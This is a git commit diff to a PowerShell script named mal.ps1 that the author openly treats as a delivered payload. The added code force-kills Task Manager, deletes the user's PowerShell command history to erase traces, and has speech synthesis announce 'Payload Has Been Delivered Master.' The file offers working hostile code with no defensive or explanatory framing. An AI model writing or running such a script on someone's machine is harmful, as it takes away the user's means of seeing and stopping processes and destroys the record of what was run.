8497eb791612a16e9fc79db0d4561bc598a6ef08
Elijah Cuff <62396650+ElijahCuff@users.noreply.github.com>
2022-08-16 11:54:48 +1000

    Update mal.ps1
    up

--- mal.ps1
+++ mal.ps1
@@ -1,5 +1,19 @@
+# Kill Task Manager 
 taskkill /F /IM taskmgr.exe
+# Create a new File ( ToDo )
+$file = "$env:temp/run.tmp";
+
+# Remove PowerShell Command History 
+Remove-Item -Path "$env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
+
+# Start a TTS Instance 
 Add-Type -AssemblyName System.speech
 $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
-$speak.Speak("WARNING! WARNING! WARNING!");
+
+
+# Speak Some Crap 
+$speak.Speak("Payload Has Been Delivered Master.");
+
+# Remove new File ( ToDo )
+del $file;
 exit
